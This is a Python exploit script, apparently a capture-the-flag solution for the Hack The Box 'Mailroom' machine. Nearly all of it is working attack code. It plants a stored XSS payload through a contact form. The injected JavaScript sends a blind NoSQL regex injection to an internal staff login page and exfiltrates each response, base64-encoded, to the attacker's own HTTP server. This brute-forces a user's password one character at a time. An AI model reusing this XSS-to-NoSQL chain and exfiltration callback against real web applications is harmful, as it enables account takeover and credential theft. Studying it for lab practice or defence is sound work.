#!/usr/bin/env python3

"""
Author: poorduck
Date: 2023-04-20
Description: This script exploits a blind NoSQL injection vulnerability to extract a 12-character password from a web application
             running on the Hack The Box Mailroom machine (IP: 10.10.11.209). The vulnerability is present in the parameter
             verification mechanism of the internal staff review panel. The password is leaked character by character using a regex-based
             blind NoSQL injection attack. The attack is performed by injecting an XSS payload via the contact form of the web
             application, which sends a POST request to the internal staff review panel with a NoSQL payload containing the guessed
             characters. If the guessed character is correct, script's http server receives "Check your inbox for an email with your 2FA token" message.

Usage: python3 script.py

Pre-requirements:
    - vHost must be added in the "/etc/hosts" file i.e "10.10.11.209 mailroom.htb"
    - HackTheBox VPN is connected on "tun0" interface
"""

import threading
import http.server
from base64 import b64decode
import re
import requests
import string
import netifaces as ni
import os

# Get HackTheBox vpn ip from tun0 interface
try:
    htb_vpn_inf = 'tun0'
    lhost = ni.ifaddresses(htb_vpn_inf)[ni.AF_INET][0]['addr']
except ValueError as e:
    print("[!] tun0 not found!")
    exit(e)

message_received = False

# Custom handler for http server for handling received requests
class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.data_received_event = None

    def do_GET(self):
        global message_received
        # If the request has a "data" parameter
        if "data" in self.path:
            recv_data = re.findall(r"/\?data=(.*?)$", self.path)[0]
            base64_decoded = b64decode(recv_data).decode('UTF-8')
            self.data_received_event.set()
            if "Check your inbox for an email with your 2FA token" in base64_decoded:
                # print(base64_decoded)
                message_received = True

        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    # Suppress logging of HTTP requests
    def log_message(self, format, *args):
        pass

# Function for running http server
def start_server(event):
    server_address = ("", 8000)
    httpd = http.server.HTTPServer(server_address, RequestHandler)
    httpd.RequestHandlerClass.data_received_event = event
    print("Server started on port 8000")
    httpd.serve_forever()

# Function for sending xss payload using "/contact.php"
def send_request(ip, fn):
    url = 'http://mailroom.htb/contact.php'
    payload = {
        'email': 'test@test.com',
        'title': 'This is a very important message',
        'message': f'This is a very important message!</p><script src="http://{ip}:8000/{fn}"></script><p>'
    }

    requests.post(url, data=payload)

# Generate xss template file used for brute-forcing password via nosql
def generate_xss_template(ip, fn):
    xss_payload = """var req1 = new XMLHttpRequest();
req1.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
req1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
const data = "email=tristan@mailroom.htb&password[$regex]=^{char}";
req1.send(data);
var resp = req1.response;

var req2 = new XMLHttpRequest();
req2.open("GET", "http://%s:8000/?data=" + btoa(resp), false);
req2.send();
""" % ip
    
    with open(fn, 'w') as fw:
        fw.write(xss_payload)


if __name__ == "__main__":
    xss_template = "xss_template.js"
    xss_payload = 'payload.js'

    if not os.path.isfile(xss_template):
        generate_xss_template(ip=lhost, fn=xss_template)

    # Create the event object and start the server in a separate thread
    event = threading.Event()
    server_thread = threading.Thread(target=start_server, args=(event,))
    server_thread.daemon = True
    server_thread.start()

    try:
        # Brute-force logic
        password = ""
        while len(password)  != 12:
            for c in string.printable.split(' ')[0]:
                if c not in ['*','+','.','?','|', '#', '&', '$']:
                    variable_dict = {"char": password + c}
                    with open(xss_template, 'r') as fr:
                        with open(xss_payload, 'w') as fw:
                            fw.write(re.sub(r"{(\w+?)}", lambda match: variable_dict[match.group(1)], fr.read()))
                    send_request(ip=lhost, fn=xss_payload)
                    is_set = event.wait(timeout=60)  # Wait for the event to be set
                    for i in range(4):  # 4 re-try for every payload
                        if not is_set:  # if timeout error
                            print("[!] Timeout occurred, sending request again")
                            send_request(ip=lhost, fn=xss_payload)
                            is_set = event.wait(timeout=60)
                    event.clear()  # Reset the event for the next iteration
                    if message_received:
                        print("Found valid char:",c)
                        message_received = False
                        password += c
                        break
        print(password)

    except KeyboardInterrupt as e:
        print(e)
    except Exception as e:
        print(e)
    finally:
        import os; [os.remove(f) for f in [xss_template, xss_payload] if os.path.isfile(f)]
